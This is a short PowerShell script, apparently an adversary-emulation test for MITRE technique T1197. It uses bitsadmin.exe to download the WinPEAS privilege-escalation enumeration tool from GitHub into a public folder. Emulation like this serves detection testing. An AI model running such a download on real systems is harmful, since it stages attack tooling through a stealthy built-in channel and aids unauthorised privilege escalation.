# Donwload WinPeas using Bitsadmin
# Technic ID : T1197
Clear-Host
Write-Output "==============================================================================="
Write-Output "BITS Job : Donwload WINPEAS using Bitsadmin (T1197)"
Write-Output "==============================================================================="
#
Start-Process "bitsadmin.exe" -ArgumentList "/transfer DownloadsWinPEAS /download /priority normal https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe $env:PUBLIC\Toolz\winPEASany_ofs.exe" -NoNewWindow -Wait